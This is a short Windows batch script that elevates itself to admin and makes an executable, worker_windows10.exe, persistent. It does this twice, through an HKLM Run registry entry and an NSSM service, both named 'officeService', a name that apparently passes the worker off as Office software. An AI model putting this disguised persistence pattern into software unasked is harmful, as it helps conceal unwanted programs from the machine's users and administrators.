@echo off
chcp 65001 > nul
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
set script_dir=%~dp0


cd /d %script_dir%

set current_dir=%cd%
set target_dir=%current_dir%\nssm\win64
set exe_name=worker_windows10.exe
set full_path=%current_dir%\%exe_name%

cd /d %target_dir%


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v officeService /t REG_SZ /d %full_path%
nssm install officeService %full_path%

nssm start officeService


